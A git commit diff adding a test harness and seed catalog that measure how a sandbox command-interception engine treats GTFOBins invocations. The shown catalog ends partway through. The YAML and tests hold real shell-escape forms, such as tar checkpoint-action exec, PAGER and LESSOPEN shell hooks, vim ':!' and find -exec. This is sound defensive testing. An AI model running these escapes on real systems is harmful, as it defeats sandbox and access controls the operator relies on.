@@ -1,0 +1,1720 @@
+commit 1ddfd2aa6fe8078619b93df8e0361514b46295ae
+Author:     totalwindupflightsystems <totalwindupflightsystems@gmail.com>
+AuthorDate: Sun Sep 20 08:12:30 2026 -0500
+Commit:     totalwindupflightsystems <totalwindupflightsystems@gmail.com>
+CommitDate: Sun Sep 20 08:12:30 2026 -0500
+
+    feat(scripts): GTFOBins-sweep harness — seed catalog, verdict matrix, CI coverage guard (TJ-GAP-059)
+    
+    Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>
+---
+ .github/workflows/ci.yml           |   3 +
+ plugin/test_gtfobins_sweep.py      | 732 +++++++++++++++++++++++++++++++++++++
+ scripts/gtfobins-catalog-seed.yaml | 314 ++++++++++++++++
+ scripts/gtfobins-sweep.py          | 626 +++++++++++++++++++++++++++++++
+ 4 files changed, 1675 insertions(+)
+
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+index 744e21f..01775a3 100644
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -36,6 +36,9 @@ jobs:
+       - name: Validate canonical board task IDs
+         run: python scripts/board_id_guard.py
+ 
++      - name: GTFOBins sweep (posture coverage + drift guard)
++        run: python scripts/gtfobins-sweep.py --check
++
+   lint:
+     name: Lint (ruff)
+     runs-on: ubuntu-latest
+diff --git a/plugin/test_gtfobins_sweep.py b/plugin/test_gtfobins_sweep.py
+new file mode 100644
+index 0000000..594bb75
+--- /dev/null
++++ b/plugin/test_gtfobins_sweep.py
+@@ -0,0 +1,732 @@
++"""Tests for scripts/gtfobins-sweep.py (TJ-GAP-059).
++
++The sweep harness is the measuring stick for the GTFOBins surface: it reports
++what the shipped engine does with each GTFOBins invocation shape and guards the
++postures the fleet consciously accepted. These tests pin its contract:
++
++  * verdict computation runs against the LIVE engine in-process (no network, no
++    payload execution — the engine matches command STRINGS),
++  * posture classification is total and correct for both drift directions,
++  * coverage math is exact for perfect / zero / partial sets,
++  * the seed catalog is structurally valid and self-consistent,
++  * malformed catalogs fail closed naming the catalog path,
++  * the rendered report always carries the coverage line the CI gate greps.
++
++Module import path: scripts/ is not a package, so the module is loaded from its
++file path (the same pattern as plugin/test_board_id_guard.py). The sweep module
++bootstraps plugin/ onto sys.path itself when it needs the engine.
++"""
++
++from __future__ import annotations
++
++import importlib.util
++import json
++import sys
++from pathlib import Path
++
++import pytest
++
++PROJECT_ROOT = Path(__file__).resolve().parent.parent
++SWEEP_SCRIPT = PROJECT_ROOT / "scripts" / "gtfobins-sweep.py"
++SEED_CATALOG = PROJECT_ROOT / "scripts" / "gtfobins-catalog-seed.yaml"
++
++# ── module loading ─────────────────────────────────────────────────
++
++_spec = importlib.util.spec_from_file_location("gtfobins_sweep", SWEEP_SCRIPT)
++assert _spec is not None and _spec.loader is not None
++sweep_mod = importlib.util.module_from_spec(_spec)
++sys.modules["gtfobins_sweep"] = sweep_mod
++_spec.loader.exec_module(sweep_mod)
++
++
++@pytest.fixture(scope="module")
++def engine():
++    """The live engine module the sweep imports."""
++    return sweep_mod.load_engine()
++
++
++@pytest.fixture(scope="module")
++def seed_rows():
++    """The shipped seed catalog, validated by the loader."""
++    return sweep_mod.load_catalog(SEED_CATALOG)
++
++
++@pytest.fixture(scope="module")
++def seed_report(seed_rows):
++    """The shipped seed catalog swept against the live engine."""
++    return sweep_mod.SweepReport(
++        catalog_path=str(SEED_CATALOG), results=sweep_mod.sweep(seed_rows)
++    )
++
++
++def write_catalog(tmp_path: Path, text: str) -> Path:
++    """Write a catalog fixture and return its path."""
++    path = tmp_path / "catalog.yaml"
++    path.write_text(text, encoding="utf-8")
++    return path
++
++
++MINIMAL_ENTRY = """
++schema_version: 1
++entries:
++  - name: "sudo"
++    rationale: "escalator"
++    classes:
++      - class: "shell"
++        invocation: "sudo /bin/sh"
++        expected: "blocked"
++"""
++
++
++# ── engine contract ────────────────────────────────────────────────
++
++
++class TestEngineContract:
++    """The sweep's assumptions about the engine must match the engine."""
++
++    def test_action_constants_mirror_engine_vocabulary(self, engine):
++        """The report's action columns are the engine's own Action values."""
++        assert sweep_mod.ACTION_ALLOW == engine.Action.ALLOW
++        assert sweep_mod.ACTION_BLOCK == engine.Action.BLOCK
++        assert sweep_mod.ACTION_MODIFY == engine.Action.MODIFY
++        assert sweep_mod.ACTION_WARN == engine.Action.WARN
++
++    def test_verdict_action_is_a_plain_str(self, engine):
++        """The foreman's verified fact: .action is a str, not an Enum."""
++        result = engine.intercept("sudo -l", config=sweep_mod.hermetic_config(engine))
++        assert isinstance(result.action, str)
++        assert repr(result.action) == "'block'"
++
++    def test_hermetic_config_ignores_host_rule_dirs(self, engine):
++        """The sweep measures shipped built-ins, not a host's rules.d."""
++        config = sweep_mod.hermetic_config(engine)
++        assert not Path(config.system_rules_dir).exists()
++        assert not Path(config.user_rules_dir).exists()
++
++
++# ── live verdict computation ───────────────────────────────────────
++
++
++class TestVerdictComputation:
++    """Rows are swept through the live engine; postures classify against it."""
++
++    def test_conscious_allow_row_classifies_as_match(self, seed_report):
++        """`git status` is allowlisted and consciously allowed → match."""
++        rows = [r for r in seed_report.results if r.binary == "git"]
++        assert len(rows) == 2
++        status = next(r for r in rows if r.function_class == "file-read")
++        assert status.action == sweep_mod.ACTION_ALLOW
++        assert status.rule_id == "allow-git-read"
++        assert status.classification == sweep_mod.CLASS_MATCH
++        assert status.drifted is False
++
++    def test_blocked_row_matches_with_block_rule_provenance(self, seed_report):
++        """sudo is the accepted block: block verdict, builtin-sudo provenance."""
++        sudo = next(r for r in seed_report.results if r.binary == "sudo")
++        assert sudo.expected == sweep_mod.POSTURE_BLOCKED
++        assert sudo.action == sweep_mod.ACTION_BLOCK
++        assert sudo.rule_id == "builtin-sudo"
++        assert sudo.classification == sweep_mod.CLASS_MATCH
++
++    def test_allow_rule_provenance_is_non_none_but_default_allow_is_none(
++        self, seed_report
++    ):
++        """A conscious allow carries a rule id; a default ALLOW carries None.
++
++        This is the distinction the report exists to make visible: `git status`
++        matched the allow-git-read allowlist rule, while `less /etc/hostname`
++        simply matched no rule at all (default-allow posture).
++        """
++        git_status = next(
++            r
++            for r in seed_report.results
++            if r.binary == "git" and r.function_class == "file-read"
++        )
++        less_read = next(
++            r
++            for r in seed_report.results
++            if r.binary == "less" and r.function_class == "file-read"
++        )
++        assert git_status.rule_id is not None
++        assert less_read.rule_id is None
++        assert git_status.action == less_read.action == sweep_mod.ACTION_ALLOW
++
++    def test_sweep_returns_one_result_per_row_in_order(self, seed_rows):
++        """Sweeping is a pure per-row evaluation, order preserved."""
++        results = sweep_mod.sweep(seed_rows)
++        assert len(results) == len(seed_rows)
++        assert [r.invocation for r in results] == [
++            row.invocation for row in seed_rows
++        ]
++
++    def test_modify_verdict_is_recorded_verbatim(self, seed_report):
++        """`env /bin/sh` is auto-sandboxed (modify), not allowed."""
++        env_shell = next(
++            r
++            for r in seed_report.results
++            if r.binary == "env" and r.function_class == "shell"
++        )
++        assert env_shell.action == sweep_mod.ACTION_MODIFY
++        assert env_shell.rule_id == "builtin-net-fetch-pipe-qualified"
++
++    def test_wrapper_does_not_hide_a_blocked_inner_command(self, seed_report):
++        """`nice sudo -l` still blocks: the escalator is read through the wrapper."""
++        wrappers = [
++            r
++            for r in seed_report.results
++            if r.function_class == "sudo"
++            and r.binary in {"env", "nice", "time", "timeout"}
++        ]
++        assert len(wrappers) == 4
++        assert {r.action for r in wrappers} == {sweep_mod.ACTION_BLOCK}
++
++
++# ── classification ─────────────────────────────────────────────────
++
++
++class TestClassification:
++    """Every (posture, action) pair maps to exactly one label."""
++
++    @pytest.mark.parametrize(
++        "expected,action,label",
++        [
++            ("blocked", "block", sweep_mod.CLASS_MATCH),
++            ("blocked", "allow", sweep_mod.CLASS_DRIFT_UNPROTECTED),
++            ("blocked", "modify", sweep_mod.CLASS_DRIFT_UNPROTECTED),
++            ("allowed-conscious", "allow", sweep_mod.CLASS_MATCH),
++            ("allowed-conscious", "block", sweep_mod.CLASS_DRIFT_OVERBLOCKED),
++            ("review", "allow", sweep_mod.CLASS_REVIEW),
++            ("review", "block", sweep_mod.CLASS_REVIEW),
++            ("review", "modify", sweep_mod.CLASS_REVIEW),
++        ],
++    )
++    def test_classify_matrix(self, expected, action, label):
++        assert sweep_mod.classify(expected, action) == label
++
++    def test_review_rows_are_never_drift(self):
++        """A review row carries no expectation, so it can never be drift."""
++        for action in sweep_mod.ACTION_COLUMNS:
++            assert (
++                sweep_mod.classify(sweep_mod.POSTURE_REVIEW, action)
++                == sweep_mod.CLASS_REVIEW
++            )
++
++    def test_classify_is_total_over_postures_and_actions(self):
++        """No unhandled branch: every posture/action pair yields a label."""
++        for expected in sweep_mod.POSTURES:
++            for action in sweep_mod.ACTION_COLUMNS:
++                assert isinstance(sweep_mod.classify(expected, action), str)
++
++
++# ── coverage math ──────────────────────────────────────────────────
++
++
++def row_with(expected: str, action: str) -> object:
++    """Build a RowResult with a chosen live action (no engine needed)."""
++    return sweep_mod.RowResult(
++        binary="x",
++        function_class="shell",
++        invocation="x",
++        expected=expected,
++        rationale="test",
++        note="",
++        action=action,
++        rule_id=None,
++        classification=sweep_mod.classify(expected, action),
++    )
++
++
++class TestCoverage:
++    """coverage counts definitive postures only; review rows are excluded."""
++
++    def test_perfect_coverage(self):
++        results = [
++            row_with("blocked", "block"),
++            row_with("allowed-conscious", "allow"),
++        ]
++        assert sweep_mod.coverage(results) == (2, 2, 100.0)
++
++    def test_zero_coverage(self):
++        results = [
++            row_with("blocked", "allow"),
++            row_with("allowed-conscious", "block"),
++        ]
++        assert sweep_mod.coverage(results) == (0, 2, 0.0)
++
++    def test_partial_coverage(self):
++        results = [
++            row_with("blocked", "block"),
++            row_with("blocked", "allow"),
++            row_with("allowed-conscious", "allow"),
++            row_with("allowed-conscious", "block"),
++        ]
++        matched, total, percent = sweep_mod.coverage(results)
++        assert (matched, total, percent) == (2, 4, 50.0)
++
++    def test_review_rows_are_excluded_from_the_denominator(self):
++        results = [
++            row_with("blocked", "block"),
++            row_with("review", "allow"),
++            row_with("review", "allow"),
++        ]
++        assert sweep_mod.coverage(results) == (1, 1, 100.0)
++
++    def test_empty_results_do_not_divide_by_zero(self):
++        assert sweep_mod.coverage([]) == (0, 0, 0.0)
++
++    def test_review_only_results_report_zero_total(self):
++        results = [row_with("review", "allow")]
++        assert sweep_mod.coverage(results) == (0, 0, 0.0)
++
++    def test_seed_catalog_coverage_is_perfect(self, seed_report):
++        """The shipped seed must match the live engine (the CI gate's premise)."""
++        matched, total, percent = sweep_mod.coverage(seed_report.results)
++        assert total > 0
++        assert matched == total
++        assert percent == 100.0
++        assert sweep_mod.drifted(seed_report.results) == []
++
++
++# ── action counts / matrix ─────────────────────────────────────────
++
++
++class TestMatrix:
++    """The matrix aggregates live verdicts per function class."""
++
++    def test_action_counts_include_every_column(self):
++        counts = sweep_mod.action_counts([row_with("blocked", "block")])
++        assert set(counts) == set(sweep_mod.ACTION_COLUMNS)
++        assert counts["block"] == 1
++        assert counts["allow"] == 0
++
++    def test_matrix_counts_and_binaries_per_class(self):
++        results = [
++            sweep_mod.RowResult(
++                binary="a",
++                function_class="shell",
++                invocation="a",
++                expected="blocked",
++                rationale="t",
++                note="",
++                action="block",
++                rule_id=None,
++                classification=sweep_mod.CLASS_MATCH,
++            ),
++            sweep_mod.RowResult(
++                binary="b",
++                function_class="shell",
++                invocation="b",
++                expected="review",
++                rationale="t",
++                note="",
++                action="allow",
++                rule_id=None,
++                classification=sweep_mod.CLASS_REVIEW,
++            ),
++        ]
++        cell = sweep_mod.matrix(results)["shell"]
++        assert cell["block"] == 1
++        assert cell["allow"] == 1
++        assert cell["binaries"] == ["a(block)", "b(allow)"]
++
++    def test_matrix_does_not_duplicate_a_binary_with_one_verdict(self):
++        """A class is one row per binary per verdict — not per catalog row."""
++        results = [
++            sweep_mod.RowResult(
++                binary="nice",
++                function_class="shell",
++                invocation=i,
++                expected="review",
++                rationale="t",
++                note="",
++                action="allow",
++                rule_id=None,
++                classification=sweep_mod.CLASS_REVIEW,
++            )
++            for i in ("nice /bin/sh", "nice -n 5 /bin/sh -p")
++        ]
++        cell = sweep_mod.matrix(results)["shell"]
++        assert cell["allow"] == 2
++        assert cell["binaries"] == ["nice(allow)"]
++
++
++# ── catalog integrity ──────────────────────────────────────────────
++
++
++class TestSeedCatalogIntegrity:
++    """Every seed seed entry is complete, unique and posture-valid."""
++
++    def test_loads_from_the_default_path(self):
++        """The default path constant points at the shipped seed."""
++        assert seed_catalog_matches_default()
++
++    def test_every_entry_has_the_required_fields(self, seed_rows):
++        assert seed_rows
++        for row in seed_rows:
++            assert row.binary.strip()
++            assert row.function_class.strip()
++            assert row.invocation.strip()
++            assert row.expected in sweep_mod.POSTURES
++            assert row.rationale.strip()
++
++    def test_binary_names_are_unique(self):
++        """Duplicate names are rejected at load, so the shipped set is unique."""
++        raw = _raw_seed_entries()
++        names = [entry["name"] for entry in raw]
++        assert len(set(names)) == len(names)
++
++    def test_duplicate_binary_name_is_rejected_before_use(self, tmp_path, capsys):
++        """The loader's duplicate check is what keeps names unique."""
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'x'\n"
++            "    rationale: 'r'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'x'\n"
++            "        expected: 'blocked'\n"
++            "  - name: 'x'\n"
++            "    rationale: 'r'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'y'\n"
++            "        expected: 'blocked'\n",
++        )
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        assert "duplicate" in capsys.readouterr().err
++
++    def test_every_binary_carries_a_rationale(self):
++        for entry in _raw_seed_entries():
++            assert entry["rationale"].strip(), entry["name"]
++
++    def test_seed_covers_the_named_binary_set(self):
++        """The seed must include the binaries the task named."""
++        required = {
++            "sudo",
++            "vim",
++            "less",
++            "git",
++            "tar",
++            "find",
++            "awk",
++            "env",
++            "nmap",
++            "openssl",
++            "python3",
++            "perl",
++            "ruby",
++            "php",
++            "bash",
++            "nice",
++            "time",
++            "timeout",
++        }
++        assert {entry["name"] for entry in _raw_seed_entries()} == required
++
++    def test_seed_size_in_the_stated_range(self):
++        assert 15 <= len(_raw_seed_entries()) <= 25
++
++    def test_review_posture_is_present(self):
++        """Review marks what has NOT been consciously accepted yet."""
++        postures = {
++            cls["expected"]
++            for entry in _raw_seed_entries()
++            for cls in entry["classes"]
++        }
++        assert sweep_mod.POSTURE_REVIEW in postures
++        assert sweep_mod.POSTURE_BLOCKED in postures
++        assert sweep_mod.POSTURE_ALLOWED_CONSCIOUS in postures
++
++    def test_invocations_are_single_line(self, seed_rows):
++        for row in seed_rows:
++            assert "\n" not in row.invocation
++
++    def test_duplicate_invocation_within_a_binary_class_is_absent(self, seed_rows):
++        seen = set()
++        for row in seed_rows:
++            key = (row.binary, row.function_class, row.invocation)
++            assert key not in seen, key
++            seen.add(key)
++
++
++def _raw_seed_entries() -> list[dict]:
++    """The seed catalog's raw entries (for structural assertions)."""
++    import yaml
++
++    data = yaml.safe_load(SEED_CATALOG.read_text(encoding="utf-8"))
++    return data["entries"]
++
++
++def seed_catalog_matches_default() -> bool:
++    """The module's default catalog path is the shipped seed file."""
++    return Path(sweep_mod.DEFAULT_CATALOG) == SEED_CATALOG
++
++
++# ── malformed catalog error paths ──────────────────────────────────
++
++
++class TestCatalogValidation:
++    """Malformed catalogs fail closed, naming the offending path."""
++
++    def test_missing_file_raises_system_exit_naming_the_path(self, tmp_path, capsys):
++        missing = tmp_path / "nope.yaml"
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(missing)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        assert str(missing) in capsys.readouterr().err
++
++    def test_bad_yaml_raises_system_exit_naming_the_path(self, tmp_path, capsys):
++        path = write_catalog(tmp_path, "entries: [\n  - name: 'x'\n")
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        assert str(path) in capsys.readouterr().err
++
++    def test_non_list_entries_raises_system_exit_naming_the_path(
++        self, tmp_path, capsys
++    ):
++        path = write_catalog(tmp_path, "schema_version: 1\nentries: not-a-list\n")
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        err = capsys.readouterr().err
++        assert str(path) in err
++        assert "entries" in err
++
++    def test_missing_required_field_raises_system_exit_naming_the_path(
++        self, tmp_path, capsys
++    ):
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'x'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'x'\n"
++            "        expected: 'blocked'\n",
++        )
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        err = capsys.readouterr().err
++        assert str(path) in err
++        assert "rationale" in err
++
++    def test_invalid_posture_raises_system_exit_naming_the_path(
++        self, tmp_path, capsys
++    ):
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'x'\n"
++            "    rationale: 'r'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'x'\n"
++            "        expected: 'probably-fine'\n",
++        )
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        err = capsys.readouterr().err
++        assert str(path) in err
++        assert "expected" in err
++
++    def test_duplicate_binary_name_is_rejected(self, tmp_path, capsys):
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'x'\n"
++            "    rationale: 'first'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'x'\n"
++            "        expected: 'blocked'\n"
++            "  - name: 'x'\n"
++            "    rationale: 'second'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'y'\n"
++            "        expected: 'blocked'\n",
++        )
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        err = capsys.readouterr().err
++        assert str(path) in err
++        assert "duplicate" in err
++
++    def test_unknown_top_level_key_is_rejected(self, tmp_path, capsys):
++        path = write_catalog(tmp_path, "entries: []\nfreestyle: true\n")
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--catalog", str(path)])
++        assert excinfo.value.code == sweep_mod.EXIT_CATALOG_ERROR
++        err = capsys.readouterr().err
++        assert str(path) in err
++        assert "freestyle" in err
++
++    def test_catalog_error_carries_the_path_in_the_message(self, tmp_path):
++        missing = tmp_path / "ghost.yaml"
++        with pytest.raises(sweep_mod.CatalogError) as excinfo:
++            sweep_mod.load_catalog(missing)
++        assert str(missing) in str(excinfo.value)
++
++    def test_valid_catalog_is_not_rejected(self, tmp_path):
++        path = write_catalog(tmp_path, MINIMAL_ENTRY)
++        rows = sweep_mod.load_catalog(path)
++        assert len(rows) == 1
++        assert rows[0].binary == "sudo"
++
++
++# ── rendering ──────────────────────────────────────────────────────
++
++
++class TestRendering:
++    """Both formats carry the same data, and the coverage line is greppable."""
++
++    def test_text_report_contains_the_coverage_line(self, seed_report):
++        text = sweep_mod.render_text(seed_report)
++        assert "gtfobins-coverage" in text
++
++    def test_text_report_names_every_function_class(self, seed_report):
++        text = sweep_mod.render_text(seed_report)
++        for function_class in sweep_mod.matrix(seed_report.results):
++            assert function_class in text
++
++    def test_text_report_lists_drift_and_review_sections(self, seed_report):
++        text = sweep_mod.render_text(seed_report)
++        assert "POSTURE-DRIFT" in text
++        assert "REVIEW" in text
++
++    def test_json_parses_and_matches_the_text_data(self, seed_report):
++        payload = json.loads(sweep_mod.render_json(seed_report))
++        matched, total, percent = sweep_mod.coverage(seed_report.results)
++        assert payload["coverage"]["matched"] == matched
++        assert payload["coverage"]["total"] == total
++        assert payload["coverage"]["percent"] == percent
++        assert len(payload["rows"]) == len(seed_report.results)
++        assert payload["entries"]["binaries"] == len(
++            {r.binary for r in seed_report.results}
++        )
++
++    def test_json_is_byte_stable(self, seed_report):
++        assert sweep_mod.render_json(seed_report) == sweep_mod.render_json(
++            seed_report
++        )
++
++    def test_json_matrix_matches_the_row_data(self, seed_report):
++        payload = json.loads(sweep_mod.render_json(seed_report))
++        for row in payload["rows"]:
++            cell = payload["matrix"][row["class"]]
++            assert cell[row["action"]] >= 1
++
++
++# ── CLI behaviour ──────────────────────────────────────────────────
++
++
++class TestCli:
++    """Exit codes: 0 advisory, 1 on drift under --check, 2 on catalog errors."""
++
++    def test_advisory_mode_exits_zero(self, capsys):
++        assert sweep_mod.main([]) == sweep_mod.EXIT_OK
++        assert "gtfobins-coverage" in capsys.readouterr().out
++
++    def test_check_mode_exits_zero_on_the_seed_catalog(self, capsys):
++        """The seed must not fail --check: no definitive drift may exist."""
++        assert sweep_mod.main(["--check"]) == sweep_mod.EXIT_OK
++        out = capsys.readouterr().out
++        assert "gtfobins-coverage" in out
++        assert "[check] OK" in out
++
++    def test_check_mode_exits_one_on_definitive_drift(self, tmp_path, capsys):
++        """A blocked posture that the engine allows is the regression signal."""
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'vim'\n"
++            "    rationale: 'drifted on purpose'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'vim -c q'\n"
++            "        expected: 'blocked'\n",
++        )
++        assert sweep_mod.main(["--catalog", str(path), "--check"]) == (
++            sweep_mod.EXIT_DRIFT
++        )
++        out = capsys.readouterr().out
++        assert "DRIFT-UNPROTECTED" in out
++        assert "[check] FAIL" in out
++
++    def test_check_mode_ignores_review_drift(self, tmp_path, capsys):
++        """review rows have no posture to defend; they never fail --check."""
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'vim'\n"
++            "    rationale: 'no posture yet'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'vim -c q'\n"
++            "        expected: 'review'\n",
++        )
++        assert sweep_mod.main(["--catalog", str(path), "--check"]) == (
++            sweep_mod.EXIT_OK
++        )
++        out = capsys.readouterr().out
++        assert "REVIEW" in out
++        assert "[check] OK" in out
++
++    def test_check_mode_flags_an_allow_posture_that_now_blocks(
++        self, tmp_path, capsys
++    ):
++        """Over-blocking is drift too: a conscious allow must stay allowed."""
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'sudo'\n"
++            "    rationale: 'pretend this was consciously allowed'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'sudo -l'\n"
++            "        expected: 'allowed-conscious'\n",
++        )
++        assert sweep_mod.main(["--catalog", str(path), "--check"]) == (
++            sweep_mod.EXIT_DRIFT
++        )
++        assert "DRIFT-OVERBLOCKED" in capsys.readouterr().out
++
++    def test_format_json_emits_parseable_json(self, capsys):
++        assert sweep_mod.main(["--format", "json"]) == sweep_mod.EXIT_OK
++        payload = json.loads(capsys.readouterr().out)
++        assert "coverage" in payload and "matrix" in payload
++
++    def test_format_json_check_drift_still_exits_one(self, tmp_path, capsys):
++        path = write_catalog(
++            tmp_path,
++            "schema_version: 1\nentries:\n"
++            "  - name: 'vim'\n"
++            "    rationale: 'drifted'\n"
++            "    classes:\n"
++            "      - class: 'shell'\n"
++            "        invocation: 'vim -c q'\n"
++            "        expected: 'blocked'\n",
++        )
++        code = sweep_mod.main(["--catalog", str(path), "--check", "--format", "json"])
++        assert code == sweep_mod.EXIT_DRIFT
++        payload = json.loads(capsys.readouterr().out)
++        assert payload["drift"]
++
++    def test_stdout_flag_is_accepted(self, capsys):
++        assert sweep_mod.main(["--stdout"]) == sweep_mod.EXIT_OK
++        assert "gtfobins-coverage" in capsys.readouterr().out
++
++    def test_help_documents_the_check_exit_rule(self, capsys):
++        with pytest.raises(SystemExit) as excinfo:
++            sweep_mod.main(["--help"])
++        assert excinfo.value.code == 0
++        out = capsys.readouterr().out
++        assert "--check exit rule" in out
++        assert "review" in out
+diff --git a/scripts/gtfobins-catalog-seed.yaml b/scripts/gtfobins-catalog-seed.yaml
+new file mode 100644
+index 0000000..fb2a2ac
+--- /dev/null
++++ b/scripts/gtfobins-catalog-seed.yaml
+@@ -0,0 +1,314 @@
++# GTFOBins sweep — seed catalog (TJ-GAP-059)
++#
++# Machine-readable shape of the GTFOBins problem for terminal-jail: per binary,
++# the GTFOBins function classes it is documented under, ONE representative
++# invocation per class, and the posture the fleet accepts for that invocation.
++#
++# This file is MEASUREMENT INPUT, not enforcement. Nothing here blocks anything:
++# scripts/gtfobins-sweep.py evaluates every invocation against the live engine
++# and reports where the engine disagrees with the recorded posture.
++#
++# `expected` is one of:
++#   allowed-conscious  the engine allows it and we accept that — the dual-use
++#                      tool doing its designed job, with no capability gained
++#                      beyond what the operator already has (reading a readable
++#                      file, archiving a readable path, writing a writable one).
++#   blocked            the engine must block it. A silently-allowed `blocked`
++#                      row is the regression the CI gate exists to catch.
++#   review             no conscious decision recorded yet. The live verdict is
++#                      reported for visibility but never fails --check; these
++#                      rows are the queue for a human decision, not a bug list.
++#
++# Invocations are REAL GTFOBins forms with their destructive targets neutralized
++# (`/etc/hostname` for an arbitrary readable file, `/tmp/tj059-sweep.*` for a
++# scratch path, `127.0.0.1:9` for an attacker endpoint, `id`/`/bin/true` for a
++# payload). The engine evaluates these as STRINGS — it never executes a payload —
++# and a human reading this file must treat every form as hostile. `sudo ...`
++# forms are safe to record verbatim.
++#
++# One representative invocation per class is the convention; a class may carry a
++# second row when the engine's verdict differs by shape, because that contrast is
++# itself the measurement (e.g. `find` -name vs -exec, `php` exec vs pcntl_exec).
++#
++# Seed scope: 18 binaries. The upstream catalog has ~478; this file is the
++# starting point, and every entry carries the rationale for its posture.
++
++schema_version: 1
++
++entries:
++  - name: "sudo"
++    rationale: "The one escalator class the engine blocks outright; nothing about sudo is dual-use inside a sandbox that has no privileges to hand out."
++    classes:
++      - class: "shell"
++        invocation: "sudo /bin/sh"
++        expected: "blocked"
++        note: "builtin-sudo. Every GTFOBins sudo vector starts here; the block is the accepted protection."
++
++  - name: "vim"
++    rationale: "Interactive editor: the operator edits files with it, so it stays allowed, but its command/file-write escapes are not consciously accepted yet."
++    classes:
++      - class: "file-read"
++        invocation: "vim /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Opening a world-readable file in an editor grants no capability the operator lacks."
++      # GTFOBins file-write: vim -c ':w /path/to/output-file' (writing is the editor's job)
++      - class: "file-write"
++        invocation: "vim -c ':w /tmp/tj059-sweep-vim-out' -c q /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Writing a file the operator could write with any tool; no privilege is crossed."
++      - class: "command"
++        invocation: "vim -c ':!id' -c q"
++        expected: "review"
++        note: "Shell escape from inside the editor: live ALLOW with no rule provenance. Accepted only insofar as the operator could run id directly."
++
++  - name: "less"
++    rationale: "Pager: reading files is its entire purpose, so the read path is consciously allowed; the LESSOPEN hook that turns it into an executor is not."
++    classes:
++      - class: "file-read"
++        invocation: "less /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Text reader on a readable file; the everyday dual-use case."
++      - class: "command"
++        invocation: "LESSOPEN='/bin/sh # %s' less /etc/hostname"
++        expected: "review"
++        note: "GTFOBins command execution via LESSOPEN: live ALLOW. Not yet accepted, not yet blocked."
++
++  - name: "git"
++    rationale: "Development tool the sandbox exists to serve. Read subcommands are allowlisted and consciously allowed; the PAGER escape to a shell is not."
++    classes:
++      - class: "file-read"
++        invocation: "git status"
++        expected: "allowed-conscious"
++        note: "Matches the allow-git-read allowlist rule (rule provenance is the proof this is a conscious ALLOW, not a default)."
++      - class: "shell"
++        invocation: "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help"
++        expected: "review"
++        note: "GTFOBins shell via PAGER: live ALLOW. Environment variable is honored before the pager runs."
++
++  - name: "tar"
++    rationale: "Archiver: create/extract of readable paths is its designed job and grants nothing new; the checkpoint-action exec escape is an executor installed in an archiver and is not accepted."
++    classes:
++      - class: "file-read"
++        invocation: "tar -cf /tmp/tj059-sweep.tar /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Equivalent to cat-ing a readable path into an archive; no new read capability."
++      - class: "shell"
++        invocation: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
++        expected: "review"
++        note: "GTFOBins shell via --checkpoint-action=exec: live ALLOW. Sharpest tar vector measured."
++      - class: "file-write"
++        invocation: "tar -xf /tmp/tj059-sweep.tar -C /tmp"
++        expected: "allowed-conscious"
++        note: "Extraction writes only where the operator can already write."
++
++  - name: "find"
++    rationale: "The engine draws the line INSIDE find: its search forms are allowlisted and consciously allowed, while -exec/-delete (arbitrary execution) is blocked."
++    classes:
++      - class: "file-read"
++        invocation: "find /tmp -maxdepth 1 -name tj059"
++        expected: "allowed-conscious"
++        note: "Matches the allow-find-safe allowlist rule; name search grants nothing."
++      - class: "shell"
++        invocation: "find . -exec /bin/sh -c 'id' ; -quit"
++        expected: "blocked"
++        note: "builtin-vm-delete covers -exec/-ok/-delete. The conscious block; a drift here is unprotected."
++      - class: "file-write"
++        invocation: "find /tmp -maxdepth 1 -fprintf /tmp/tj059-sweep-find-out x -quit"
++        expected: "review"
